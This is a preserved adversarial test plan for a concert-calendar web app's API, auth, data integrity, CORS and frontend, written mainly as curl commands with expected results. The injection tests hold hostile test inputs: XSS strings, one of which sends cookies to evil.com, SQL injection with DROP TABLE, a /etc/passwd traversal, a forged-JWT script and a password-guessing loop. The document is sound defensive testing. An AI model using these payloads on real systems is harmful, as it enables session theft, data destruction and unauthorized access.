# Adversarial Test Plan (reference)

> **Provenance:** written 2026-04 on the never-merged `claude/write-test-plan-WnbEW` branch,
> for the PostgreSQL-as-single-source-of-truth migration. Preserved here 2026-09-01 when that
> branch was cleaned up. **It is a catalogue of cases to think with, not a green/red checklist**
> — nothing here runs automatically, and the migration it was written for is long done.
>
> **What is automated now** (`./test_before_push.sh`, see [`testing.md`](testing.md)):
> §1 Auth partly by `test_admin_auth.py`; §3 Injection/XSS by `test_escaping.mjs`,
> `test_xss_browser.py`, `test_event_page.py`; §4 CORS partly by `test_security_headers.py`;
> §10 Frontend partly by `test_deeplink_browser.py`.
>
> **What is still manual-only** and is the reason this file was kept: §2 source priority and
> data integrity, §5 public endpoints, §6 performance, §7 sponsors, §8 the v1 API-key system,
> §9 Slack, §11 CI/CD, §13 venue management, §14 bulk operations, §15 edge cases.
> §12 data-migration integrity is obsolete.
>
> Treat any specific line number, column, or endpoint below as five months stale.

---


**Objective:** Break the application. Every test below is designed to find bugs, security holes, data corruption paths, or failure modes in the migrated concert calendar system.

**Application Under Test:**
- Frontend: `concert-calendar-eight.vercel.app` (static HTML + JS on Vercel)
- Backend API: `concert-calendar-api.onrender.com` (Flask on Render)
- Database: PostgreSQL on Render
- CI/CD: GitHub Actions (2x daily scraper runs)

**Conventions:**
- `API_BASE` = `https://concert-calendar-api.onrender.com`
- `ADMIN_TOKEN` = valid JWT from `/api/admin/login`
- All `curl` commands assume `Content-Type: application/json` unless noted

---

## Section 1: Authentication and Authorization

### TEST-AUTH-01: Access admin endpoints without authentication
- **Steps:**
  ```bash
  curl -s API_BASE/api/admin/events
  curl -s API_BASE/api/admin/venues
  curl -s API_BASE/api/admin/submissions
  curl -s API_BASE/api/admin/sponsors
  curl -s API_BASE/api/admin/calendar-sponsor
  curl -s API_BASE/api/admin/scraper/logs
  curl -s API_BASE/api/admin/api-keys
  curl -s API_BASE/api/admin/api-key-requests
  ```
- **Expected:** Every request returns `401` with `{"error": "Not authenticated"}`
- **Failure looks like:** Any `200` response, any data returned, or a `500` error (leaking stack traces)

### TEST-AUTH-02: Access admin endpoints with expired JWT
- **Steps:**
  1. Obtain a valid token via login
  2. Manually decode the JWT payload, set `exp` to a past timestamp
  3. Re-encode and re-sign (will fail signature check) or wait 8+ hours
  4. Send requests with the expired/tampered token
  ```bash
  curl -s -H "Authorization: Bearer eyJ...TAMPERED" API_BASE/api/admin/events
  ```
- **Expected:** `401 Not authenticated`
- **Failure looks like:** Any `200` response or data returned

### TEST-AUTH-03: Access admin endpoints with forged JWT (wrong secret)
- **Steps:**
  ```bash
  # Generate a JWT signed with a random key
  python3 -c "
  import json, base64, hmac, hashlib, time
  header = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=').decode()
  payload = base64.urlsafe_b64encode(json.dumps({'sub':'admin','exp':int(time.time())+3600,'iat':int(time.time())}).encode()).rstrip(b'=').decode()
  sig = base64.urlsafe_b64encode(hmac.new(b'wrong-secret', f'{header}.{payload}'.encode(), hashlib.sha256).digest()).rstrip(b'=').decode()
  print(f'{header}.{payload}.{sig}')
  "
  # Use the output as Bearer token
  curl -s -H "Authorization: Bearer <forged_token>" API_BASE/api/admin/events
  ```
- **Expected:** `401 Not authenticated`
- **Failure looks like:** Any `200` response

### TEST-AUTH-04: Brute force admin password
- **Steps:**
  ```bash
  for pw in admin password 123456 memphis wyxr concert; do
    echo "Trying: $pw"
    curl -s -X POST API_BASE/api/admin/login \
      -H "Content-Type: application/json" \
      -d "{\"password\": \"$pw\"}"
  done
  ```
- **Expected:** All return `401 Invalid password`. No rate limiting exists (this IS a finding).
- **Failure looks like:** Any returns `200` with a token (password is trivially guessable)

### TEST-AUTH-05: Login with empty password
- **Steps:**
  ```bash
  curl -s -X POST API_BASE/api/admin/login \
    -H "Content-Type: application/json" \
    -d '{"password": ""}'
  ```
- **Expected:** `401 Invalid password`
- **Failure looks like:** `200` with token (empty string matches empty ADMIN_PASSWORD env var)

### TEST-AUTH-06: Login with no JSON body
- **Steps:**
  ```bash
  curl -s -X POST API_BASE/api/admin/login
  curl -s -X POST API_BASE/api/admin/login -H "Content-Type: application/json" -d 'not json'
  ```
- **Expected:** `401` (password mismatch) or `400` (bad request). Not `500`.
- **Failure looks like:** `500` Internal Server Error or stack trace

### TEST-AUTH-07: JWT in cookie vs header precedence
- **Steps:**
  1. Get a valid token
  2. Send request with valid token in cookie but invalid in header
  3. Send request with invalid in cookie but valid in header
  ```bash
  curl -s -H "Authorization: Bearer INVALID" --cookie "admin_token=VALID_TOKEN" API_BASE/api/admin/events
  curl -s -H "Authorization: Bearer VALID_TOKEN" --cookie "admin_token=INVALID" API_BASE/api/admin/events
  ```
- **Expected:** Header takes precedence. First request: `401`. Second request: `200`.
- **Failure looks like:** Cookie overrides header, or both are ignored

### TEST-AUTH-08: SQL injection in login password field
- **Steps:**
  ```bash
  curl -s -X POST API_BASE/api/admin/login \
    -H "Content-Type: application/json" \
    -d '{"password": "\" OR 1=1 --"}'
  ```
- **Expected:** `401 Invalid password` (password is compared with hmac.compare_digest, not SQL)
- **Failure looks like:** `200` with token or `500` error

---

## Section 2: Source Priority and Data Integrity

### TEST-SRC-01: Manual events survive scraper overwrite
- **Steps:**
  1. Create a manual event via admin API:
  ```bash
  curl -s -X POST API_BASE/api/admin/events \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
      "title": "QA Test - Manual Sacred Event",
      "venue": "Hi Tone",
      "date": "2026-06-15",
      "start_time": "8:00 PM",
      "description": "This must never be overwritten",
      "source": "manual"
    }'
  ```
  2. Note the event ID returned
  3. Run the scraper pipeline: `python -m src.main`
  4. Query the event again:
  ```bash
  curl -s API_BASE/api/events/<event_id>
  ```
- **Expected:** Event unchanged. `source` still `"manual"`. Description still `"This must never be overwritten"`.
- **Failure looks like:** Description, title, or any field changed. Source changed from `"manual"` to `"scraper:*"`.

### TEST-SRC-02: Scraper overwrites artifact-sourced events
- **Steps:**
  1. Insert an event with source `"artifact"` directly in DB or via Slack pipeline
  2. Run scrapers that would match the same event (same title/venue/date)
  3. Check if the scraper version replaced the artifact version
- **Expected:** Event updated with scraper data. `source` changed to `"scraper:{name}"`.
- **Failure looks like:** Artifact version persists despite scraper having better data.

### TEST-SRC-03: Artifact cannot overwrite scraper-sourced events
- **Steps:**
  1. Ensure an event exists with `source = "scraper:ticketmaster"`
  2. Process an image/artifact that contains the same event (same title/venue/date)
  3. Check the event's source column
- **Expected:** Event unchanged. Source still `"scraper:ticketmaster"`.
- **Failure looks like:** Source changed to `"artifact"` or event fields overwritten.

### TEST-SRC-04: Admin edit promotes any event to "manual" (protected)
- **Steps:**
  1. Find an event with `source = "scraper:ticketmaster"` or `"artifact"`
  2. Edit it via admin API (change description):
  ```bash
  curl -s -X PUT API_BASE/api/admin/events/<event_id> \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"description": "Admin edited this"}'
  ```
  3. Check the source column
- **Expected:** `source` is now `"manual"` regardless of what it was before.
- **Failure looks like:** Source remains `"scraper:*"` or `"artifact"` after admin edit.

### TEST-SRC-05: Create event via admin with explicit non-manual source
- **Steps:**
  ```bash
  curl -s -X POST API_BASE/api/admin/events \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
      "title": "Source Override Test",
      "date": "2026-07-01",
      "source": "scraper:evil"
    }'
  ```
- **Expected:** Event created with `source = "manual"` (admin API should force manual) OR the supplied source is accepted (both are defensible, but document which).
- **Failure looks like:** Source is `"scraper:evil"` and the event is unprotected from scraper overwrites despite being admin-created.

### TEST-SRC-06: Duplicate event deduplication with same title/venue/date
- **Steps:**
  1. Create event: title="Blues Night", venue="Hi Tone", date="2026-08-01"
  2. Run scraper that finds the same event
  3. Check DB for duplicates:
  ```bash
  python3 -c "
  import os, psycopg2
  conn = psycopg2.connect(os.environ['DATABASE_URL'])
  cur = conn.cursor()
  cur.execute(\"SELECT id, title, source FROM events WHERE title ILIKE '%Blues Night%' AND date = '2026-08-01'\")
  for r in cur.fetchall(): print(r)
  conn.close()
  "
  ```
- **Expected:** Only one row exists. No duplicates.
- **Failure looks like:** Two or more rows with the same title/venue/date.

### TEST-SRC-07: Verify source column is never NULL
- **Steps:**
  ```bash
  python3 -c "
  import os, psycopg2
  conn = psycopg2.connect(os.environ['DATABASE_URL'])
  cur = conn.cursor()
  cur.execute('SELECT COUNT(*) FROM events WHERE source IS NULL')
  print('NULL sources:', cur.fetchone()[0])
  conn.close()
  "
  ```
- **Expected:** 0 NULL sources (column has NOT NULL + DEFAULT).
- **Failure looks like:** Any non-zero count.

### TEST-SRC-08: Event CRUD lifecycle integrity
- **Steps:**
  1. **Create:** POST to `/api/admin/events` with full payload. Note ID.
  2. **Read:** GET `/api/events/<id>`. Verify all fields match.
  3. **Update:** PUT to `/api/admin/events/<id>` changing title and description.
  4. **Read again:** Verify changes persisted. Verify `updated_at` changed.
  5. **Delete:** DELETE `/api/admin/events/<id>`.
  6. **Read again:** GET `/api/events/<id>` should return 404 (soft-deleted, is_active=false).
  7. **Admin read:** GET `/api/admin/events?include_inactive=true` should still include it.
- **Expected:** Each state transition is clean. Soft-delete hides from public, visible to admin.
- **Failure looks like:** Event disappears entirely, or soft-deleted event still appears in public API.

### TEST-SRC-09: Submission lifecycle (pending -> approved -> event created)
- **Steps:**
  1. Submit community event via public endpoint:
  ```bash
  curl -s -X POST API_BASE/api/submissions \
    -H "Content-Type: application/json" \
    -d '{
      "artist_name": "Test Band QA",
      "venue": "Hi Tone",
      "event_date": "2026-09-15",
      "event_time": "20:00",
      "description": "QA test submission",
      "submitter_name": "QA Tester",
      "submitter_email": "qa@test.com"
    }'
  ```
  2. Check pending count: GET `/api/admin/submissions/pending-count`
  3. Approve it: POST `/api/admin/submissions/<id>/approve`
  4. Verify an event was created in the events table
  5. Verify the submission status changed to "approved"
- **Expected:** Clean lifecycle. Event created with data from submission.
- **Failure looks like:** Event not created, submission stuck in pending, or duplicate events.

### TEST-SRC-10: Reject submission, then verify no event created
- **Steps:**
  1. Submit a community event
  2. Reject it: POST `/api/admin/submissions/<id>/reject`
  3. Query events table for the submitted artist name
- **Expected:** No event created. Submission status is "rejected".
- **Failure looks like:** Event exists in DB despite rejection.

---

## Section 3: Input Validation and Injection Attacks

### TEST-INJ-01: XSS in event title (stored XSS via admin)
- **Steps:**
  ```bash
  curl -s -X POST API_BASE/api/admin/events \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
      "title": "<script>alert(document.cookie)</script>",
      "date": "2026-07-01",
      "venue": "Hi Tone"
    }'
  ```
  Then load the public calendar in a browser and check if the script executes.
- **Expected:** Script tag is escaped/sanitized in HTML output. No alert fires.
- **Failure looks like:** JavaScript alert box with cookie value. This is a critical stored XSS vulnerability.

### TEST-INJ-02: XSS in community submission fields
- **Steps:**
  ```bash
  curl -s -X POST API_BASE/api/submissions \
    -H "Content-Type: application/json" \
    -d '{
      "artist_name": "<img src=x onerror=alert(1)>",
      "venue": "\"><script>fetch(\"https://evil.com/?c=\"+document.cookie)</script>",
      "event_date": "2026-07-01",
      "submitter_name": "Normal Name",
      "submitter_email": "test@test.com"
    }'
  ```
  Then view the submission in the admin UI.
- **Expected:** HTML is escaped when rendered. No script execution in admin dashboard.
- **Failure looks like:** Admin dashboard executes injected JavaScript when viewing submissions.

### TEST-INJ-03: XSS in event description (rendered in public calendar detail modal)
- **Steps:**
  ```bash
  curl -s -X POST API_BASE/api/admin/events \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
      "title": "Normal Title",
      "date": "2026-07-01",
      "venue": "Hi Tone",
      "description": "<iframe src=\"javascript:alert(1)\"></iframe><img src=x onerror=alert(document.domain)>"
    }'
  ```
  Open the event detail on the public calendar.
- **Expected:** Raw HTML displayed as text, not rendered as HTML elements.
- **Failure looks like:** Iframe or image tag rendered, JavaScript executes.

### TEST-INJ-04: SQL injection via event_id path parameter
- **Steps:**
  ```bash
  curl -s "API_BASE/api/events/'; DROP TABLE events; --"
  curl -s "API_BASE/api/events/1 OR 1=1"
  curl -s "API_BASE/api/events/../../etc/passwd"
  ```
- **Expected:** `404` or `400` for each. Database unaffected.
- **Failure looks like:** `500` error with SQL error in response, or any data returned for the injection strings.

### TEST-INJ-05: SQL injection via query parameters
- **Steps:**
  ```bash
  curl -s "API_BASE/api/events?start_date=2026-01-01' OR '1'='1"
  curl -s "API_BASE/api/events?end_date='; DROP TABLE events;--"
  curl -s "API_BASE/api/events?featured_only=true' UNION SELECT * FROM pg_tables--"
  ```
- **Expected:** `400` or empty results. No SQL errors leaked.
- **Failure looks like:** `500` with PostgreSQL error message, or all events returned regardless of filter.

### TEST-INJ-06: Oversized event fields
- **Steps:**
  ```bash
  # Generate a 1MB string
  BIGSTR=$(python3 -c "print('A' * 1048576)")
  curl -s -X POST API_BASE/api/admin/events \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"title\": \"$BIGSTR\", \"date\": \"2026-07-01\"}"
  ```
- **Expected:** `400` with size limit error, or `413` Payload Too Large. NOT a `500`.
- **Failure looks like:** `500` error, server crash, or 1MB event stored in DB causing rendering issues.

### TEST-INJ-07: Unicode and special characters in event fields
- **Steps:**
  ```bash
  curl -s -X POST API_BASE/api/admin/events \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
      "title": "Cafe\u0301 Noi\u0308r \ud83c\udfb8 Live \u0000 NUL byte",
      "date": "2026-07-01",
      "venue": "B.B. King\u2019s Blues Club",
      "description": "\u202e\u0052\u0054\u004c Override text"
    }'
  ```
- **Expected:** Event created successfully (minus null byte). Renders correctly on calendar.
- **Failure looks like:** `500` error from DB encoding issue, or garbled display on calendar.

### TEST-INJ-08: Date field boundary values
- **Steps:**
  ```bash
  # Past date
  curl -s -X POST API_BASE/api/admin/events \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"title": "Past Event", "date": "2020-01-01"}'

  # Far future date
  curl -s -X POST API_BASE/api/admin/events \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"title": "Far Future", "date": "2099-12-31"}'

  # Invalid date
  curl -s -X POST API_BASE/api/admin/events \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"title": "Bad Date", "date": "not-a-date"}'

  # Feb 30 (invalid calendar date)
  curl -s -X POST API_BASE/api/admin/events \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"title": "Impossible Date", "date": "2026-02-30"}'
  ```
- **Expected:** Past date: allowed (admin may backfill). Far future: allowed. Invalid formats: `400` error.
- **Failure looks like:** `500` on invalid date, or Feb 30 silently accepted and stored.

### TEST-INJ-09: Empty and missing required fields
- **Steps:**
  ```bash
  # No title
  curl -s -X POST API_BASE/api/admin/events \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"date": "2026-07-01"}'

  # No date
  curl -s -X POST API_BASE/api/admin/events \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"title": "No Date Event"}'

  # Empty strings
  curl -s -X POST API_BASE/api/admin/events \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"title": "", "date": ""}'

  # Null values
  curl -s -X POST API_BASE/api/admin/events \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"title": null, "date": null}'
  ```
- **Expected:** All return `400` with descriptive error messages.
- **Failure looks like:** `500` or event created with NULL/empty required fields.

### TEST-INJ-10: Honeypot bypass on community submissions
- **Steps:**
  ```bash
  # With honeypot filled (bot behavior)
  curl -s -X POST API_BASE/api/submissions \
    -H "Content-Type: application/json" \
    -d '{
      "artist_name": "Spam Bot",
      "venue": "Spam Venue",
      "event_date": "2026-07-01",
      "submitter_name": "Bot",
      "submitter_email": "bot@spam.com",
      "website": "http://spam.com"
    }'
  ```
- **Expected:** Returns `200` with success message (silent discard) but NO submission saved in DB.
- **Failure looks like:** Submission actually saved in DB despite honeypot being filled.

---

## Section 4: CORS and Cross-Origin Security

### TEST-CORS-01: Verify CORS allows legitimate frontend origin
- **Steps:**
  ```bash
  curl -s -D - -o /dev/null \
    -H "Origin: https://concert-calendar-eight.vercel.app" \
    API_BASE/api/events 2>&1 | grep -i access-control
  ```
- **Expected:** `Access-Control-Allow-Origin: https://concert-calendar-eight.vercel.app` present.
- **Failure looks like:** No CORS header, or `Access-Control-Allow-Origin: *` (overly permissive).

### TEST-CORS-02: Verify CORS blocks unauthorized origins
- **Steps:**
  ```bash
  curl -s -D - -o /dev/null \
    -H "Origin: https://evil-site.com" \
    API_BASE/api/events 2>&1 | grep -i access-control
  ```
- **Expected:** No `Access-Control-Allow-Origin` header in response, or the origin is not reflected.
- **Failure looks like:** `Access-Control-Allow-Origin: https://evil-site.com` (origin reflection vulnerability).

### TEST-CORS-03: Preflight OPTIONS request for admin endpoints
- **Steps:**
  ```bash
  curl -s -D - -X OPTIONS \
    -H "Origin: https://concert-calendar-eight.vercel.app" \
    -H "Access-Control-Request-Method: POST" \
    -H "Access-Control-Request-Headers: Authorization, Content-Type" \
    API_BASE/api/admin/events 2>&1 | grep -i access-control
  ```
- **Expected:** Proper preflight response with allowed methods and headers.
- **Failure looks like:** `403` or `405` on preflight, causing admin UI to fail silently.

### TEST-CORS-04: Credentials included in cross-origin requests
- **Steps:**
  ```bash
  curl -s -D - -o /dev/null \
    -H "Origin: https://concert-calendar-eight.vercel.app" \
    API_BASE/api/events 2>&1 | grep -i "access-control-allow-credentials"
  ```
- **Expected:** `Access-Control-Allow-Credentials: true` (needed for cookie-based auth).
- **Failure looks like:** Missing header, causing admin cookie auth to fail cross-origin.

---

## Section 5: API Public Endpoints

### TEST-API-01: Public events endpoint returns correct shape
- **Steps:**
  ```bash
  curl -s API_BASE/api/events | python3 -c "
  import json, sys
  events = json.load(sys.stdin)
  assert isinstance(events, list), 'Not a list'
  if events:
      required_keys = {'id', 'title', 'date', 'venue'}
      actual_keys = set(events[0].keys())
      missing = required_keys - actual_keys
      assert not missing, f'Missing keys: {missing}'
      print(f'OK: {len(events)} events, keys: {sorted(actual_keys)}')
  "
  ```
- **Expected:** JSON array with id, title, date, venue, and other expected fields on each event.
- **Failure looks like:** Wrong structure, missing fields, or non-JSON response.

### TEST-API-02: Public events endpoint only returns active events
- **Steps:**
  1. Create an event, then soft-delete it
  2. Fetch public events and check if deleted event appears
  ```bash
  # After creating and deleting event with known ID:
  curl -s API_BASE/api/events | python3 -c "
  import json, sys
  events = json.load(sys.stdin)
  ids = [e['id'] for e in events]
  assert '<deleted_event_id>' not in ids, 'FAIL: Deleted event in public list'
  print('PASS: Deleted event not in public list')
  "
  ```
- **Expected:** Soft-deleted events (is_active=false) never appear in public API.
- **Failure looks like:** Deleted events visible to public users.

### TEST-API-03: Date range filtering
- **Steps:**
  ```bash
  curl -s "API_BASE/api/events?start_date=2026-06-01&end_date=2026-06-30" | python3 -c "
  import json, sys
  events = json.load(sys.stdin)
  for e in events:
      assert '2026-06' in e['date'], f'Event {e[\"title\"]} date {e[\"date\"]} outside range'
  print(f'PASS: All {len(events)} events within June 2026')
  "
  ```
- **Expected:** Only events within the requested date range returned.
- **Failure looks like:** Events from other months included.

### TEST-API-04: Featured-only filter
- **Steps:**
  ```bash
  curl -s "API_BASE/api/events?featured_only=true" | python3 -c "
  import json, sys
  events = json.load(sys.stdin)
  for e in events:
      assert e.get('is_featured') == True, f'{e[\"title\"]} is not featured'
  print(f'PASS: All {len(events)} events are featured')
  "
  ```
- **Expected:** Only featured events returned.
- **Failure looks like:** Non-featured events in results.

### TEST-API-05: Single event detail returns inactive event
- **Steps:**
  ```bash
  # Get a soft-deleted event ID, then:
  curl -s API_BASE/api/events/<inactive_event_id>
  ```
- **Expected:** `404 Event not found`
- **Failure looks like:** `200` with the inactive event data (information disclosure).

### TEST-API-06: Non-existent event ID
- **Steps:**
  ```bash
  curl -s API_BASE/api/events/00000000-0000-0000-0000-000000000000
  curl -s API_BASE/api/events/nonexistent
  curl -s API_BASE/api/events/999999
  ```
- **Expected:** `404` for each. No `500` errors.
- **Failure looks like:** `500` Internal Server Error (UUID parsing crash).

### TEST-API-07: Cache headers on public events
- **Steps:**
  ```bash
  curl -s -D - -o /dev/null API_BASE/api/events 2>&1 | grep -i cache-control
  ```
- **Expected:** `Cache-Control: public, max-age=1800` (30 min cache).
- **Failure looks like:** No cache headers (every page load hits DB), or `no-cache` (contradicts spec).

---

## Section 6: Performance and Load

### TEST-PERF-01: API response time with full event set
- **Steps:**
  ```bash
  time curl -s -o /dev/null -w "%{time_total}" API_BASE/api/events
  # Run 5 times, average the results
  for i in 1 2 3 4 5; do
    curl -s -o /dev/null -w "%{time_total}\n" API_BASE/api/events
  done
  ```
- **Expected:** Response under 2 seconds for warm server, under 10 seconds for cold start.
- **Failure looks like:** Consistently over 5 seconds warm, or timeout.

### TEST-PERF-02: Concurrent request handling (50 parallel)
- **Steps:**
  ```bash
  # Using GNU parallel or xargs:
  seq 50 | xargs -P 50 -I{} curl -s -o /dev/null -w "%{http_code}\n" API_BASE/api/events | sort | uniq -c
  ```
- **Expected:** All 50 return `200`. No `500` or `503` errors.
- **Failure looks like:** Connection pool exhaustion, `500` errors, or dropped connections.

### TEST-PERF-03: Large event count rendering
- **Steps:**
  1. Create 500+ events for a single week via bulk admin API
  2. Load the public calendar for that week
  3. Measure page render time in browser DevTools
- **Expected:** Page renders within 3 seconds. No browser freeze.
- **Failure looks like:** Browser hangs, excessive memory usage, or infinite scroll lag.

### TEST-PERF-04: Response size with compression
- **Steps:**
  ```bash
  # Without compression
  curl -s -D - -o /dev/null API_BASE/api/events 2>&1 | grep content-length
  # With compression
  curl -s -D - -o /dev/null -H "Accept-Encoding: gzip" API_BASE/api/events 2>&1 | grep -i "content-encoding\|content-length"
  ```
- **Expected:** Gzip/brotli compression active. Response ~70% smaller.
- **Failure looks like:** No compression (large JSON payloads on every load).

### TEST-PERF-05: No rate limiting on submission endpoint (finding)
- **Steps:**
  ```bash
  for i in $(seq 1 100); do
    curl -s -o /dev/null -w "%{http_code} " -X POST API_BASE/api/submissions \
      -H "Content-Type: application/json" \
      -d "{\"artist_name\":\"Spam$i\",\"venue\":\"Spam\",\"event_date\":\"2026-07-01\",\"submitter_name\":\"Bot\",\"submitter_email\":\"bot@test.com\"}"
  done
  ```
- **Expected (current):** All 100 return `200` (no rate limiting exists). THIS IS A FINDING.
- **What should happen:** Rate limiting (e.g., 5 submissions per IP per hour) to prevent spam floods.
- **Failure looks like:** Server crashes under load, or all 100 submissions are saved.

---

## Section 7: Sponsor System

### TEST-SPON-01: Calendar sponsor date overlap enforcement
- **Steps:**
  ```bash
  # Create first sponsor
  curl -s -X POST API_BASE/api/admin/calendar-sponsor \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
      "name": "Sponsor A",
      "image_url": "https://example.com/a.png",
      "start_date": "2026-07-01",
      "end_date": "2026-07-31"
    }'

  # Try overlapping sponsor
  curl -s -X POST API_BASE/api/admin/calendar-sponsor \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
      "name": "Sponsor B",
      "image_url": "https://example.com/b.png",
      "start_date": "2026-07-15",
      "end_date": "2026-08-15"
    }'
  ```
- **Expected:** Second request returns `409` with overlap error message.
- **Failure looks like:** Both sponsors created, causing display conflicts.

### TEST-SPON-02: Calendar sponsor with invalid/missing required fields
- **Steps:**
  ```bash
  curl -s -X POST API_BASE/api/admin/calendar-sponsor \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"name": "No Image"}'
  ```
- **Expected:** `400` with error listing missing required fields.
- **Failure looks like:** `500` error or sponsor created with NULL image_url.

### TEST-SPON-03: Public sponsor endpoint returns only active sponsors
- **Steps:**
  1. Create a sponsor, then deactivate or delete it
  2. Hit `GET /api/sponsors`
- **Expected:** Deactivated sponsors not in response.
- **Failure looks like:** Inactive sponsors served to public.

---

## Section 8: API Key System (v1 Public API)

### TEST-KEY-01: Access v1 endpoints without API key
- **Steps:**
  ```bash
  curl -s API_BASE/api/v1/events
  ```
- **Expected:** `401` with `"Missing API key"` error.
- **Failure looks like:** `200` with event data (unauthenticated access).

### TEST-KEY-02: Access v1 endpoints with revoked API key
- **Steps:**
  1. Create an API key via admin
  2. Revoke it (DELETE /api/admin/api-keys/<id>)
  3. Use the revoked key:
  ```bash
  curl -s -H "X-API-Key: <revoked_key>" API_BASE/api/v1/events
  ```
- **Expected:** `401 Invalid or revoked API key`
- **Failure looks like:** `200` with data (revoked key still works).

### TEST-KEY-03: API key passed via query parameter
- **Steps:**
  ```bash
  curl -s "API_BASE/api/v1/events?api_key=<valid_key>"
  ```
- **Expected:** `200` (query param accepted as fallback). Document if this works or not.
- **Failure looks like:** `401` despite valid key in query param (if query param auth is intended).

### TEST-KEY-04: API key usage logging
- **Steps:**
  1. Make several requests with a valid API key
  2. Check usage stats: GET `/api/admin/api-keys/<key_id>/usage`
- **Expected:** Request count matches actual usage. Endpoints logged accurately.
- **Failure looks like:** Zero usage reported, or incorrect counts.

---

## Section 9: Slack Integration

### TEST-SLACK-01: Slack webhook without valid signature
- **Steps:**
  ```bash
  curl -s -X POST API_BASE/api/slack/events \
    -H "Content-Type: application/json" \
    -d '{"type": "event_callback", "event": {"type": "file_shared", "file_id": "F123", "channel_id": "C123"}}'
  ```
- **Expected:** `403 Invalid signature`
- **Failure looks like:** `200 {"ok": true}` and background processing starts (accepting unsigned webhooks).

### TEST-SLACK-02: Slack URL verification challenge
- **Steps:**
  ```bash
  curl -s -X POST API_BASE/api/slack/events \
    -H "Content-Type: application/json" \
    -H "X-Slack-Signature: v0=fake" \
    -H "X-Slack-Request-Timestamp: $(date +%s)" \
    -d '{"type": "url_verification", "challenge": "test_challenge_123"}'
  ```
- **Expected:** Signature check likely still applies. If it passes, returns `{"challenge": "test_challenge_123"}`.
- **Failure looks like:** Challenge returned without signature verification.

### TEST-SLACK-03: Slack event from wrong channel
- **Steps:** Send a properly signed event with a channel_id that doesn't match SLACK_CHANNEL_ID.
- **Expected:** Logged as ignored, returns `{"ok": true}` but no processing occurs.
- **Failure looks like:** Image processed from unauthorized channel.

---

## Section 10: Frontend Behavior

### TEST-FE-01: Frontend loads with API down
- **Steps:**
  1. Open the calendar URL when the backend is unreachable (simulate by blocking the API domain)
  2. Or use browser DevTools to block requests to the API
- **Expected:** Loading indicator shown, then a user-friendly error message like "Unable to load events."
- **Failure looks like:** Blank page, JavaScript console errors, or infinite spinner with no message.

### TEST-FE-02: Frontend handles empty event list
- **Steps:**
  1. Set date range filter to a far-future month with no events
  2. Check what the calendar displays
- **Expected:** Friendly "No events found" or similar message.
- **Failure looks like:** Blank white space, broken layout, or JavaScript error.

### TEST-FE-03: Month navigation works correctly
- **Steps:**
  1. Load the calendar
  2. Click next month arrow repeatedly (10+ times)
  3. Click previous month arrow back to current month
  4. Verify events re-render correctly each time
- **Expected:** Smooth navigation. Events load for each month. No stale data.
- **Failure looks like:** Wrong month displayed, events from previous month shown, or navigation buttons stop working.

### TEST-FE-04: Neighborhood filter chips
- **Steps:**
  1. Load the calendar
  2. Click a neighborhood filter chip (e.g., "Midtown")
  3. Verify only events from that neighborhood are shown
  4. Click "All" or clear filter
  5. Verify all events return
- **Expected:** Filtering works correctly. Event counts match.
- **Failure looks like:** Filter shows wrong events, or clearing filter doesn't restore all events.

### TEST-FE-05: Search functionality
- **Steps:**
  1. Search for a known artist name
  2. Search for a known venue name
  3. Search for gibberish ("xyzzy12345")
  4. Search for special characters (`<script>`, `'; DROP`)
- **Expected:** Relevant results for valid searches. Empty results for gibberish. No JS errors for special characters.
- **Failure looks like:** Search crashes, XSS executes, or results don't match query.

### TEST-FE-06: Event detail modal
- **Steps:**
  1. Click on an event in the calendar
  2. Verify all fields display (title, venue, date, time, description, ticket link)
  3. Click the ticket URL link
  4. Close the modal
- **Expected:** Modal opens with full event details. Links work. Modal closes cleanly.
- **Failure looks like:** Modal shows wrong event, fields missing, or modal won't close.

### TEST-FE-07: No references to events.json in frontend
- **Steps:**
  ```bash
  grep -rn "events\.json" docs/ --include="*.html" --include="*.js"
  ```
- **Expected:** Zero matches (all data comes from API now).
- **Failure looks like:** Any active code path still referencing events.json as data source.

---

## Section 11: GitHub Actions / CI/CD

### TEST-CI-01: Workflow does not commit data files
- **Steps:**
  ```bash
  grep -n "git add\|git commit\|git push" .github/workflows/daily.yml
  ```
- **Expected:** If git operations exist, they should NOT include `data/events.json` as a committed data source. Per spec, the workflow should write to DB only.
- **Failure looks like:** `git add data/events.json` or `git add docs/` still present and actively committing generated data.

### TEST-CI-02: Scraper run writes to database
- **Steps:**
  1. Note DB event count
  2. Trigger workflow manually or run `python -m src.main`
  3. Check DB event count again
- **Expected:** Event count increases (or stays same if no new events). Source tags populated.
- **Failure looks like:** No new events in DB, or events written to events.json instead.

### TEST-CI-03: Scraper failure doesn't corrupt database
- **Steps:**
  1. Simulate a scraper failure (e.g., invalid API key for Ticketmaster)
  2. Check DB state after failure
- **Expected:** Database unchanged. Failed scraper logged in scrape_logs table. Other scrapers still run.
- **Failure looks like:** Partial data written, events deleted, or transaction left in bad state.

---

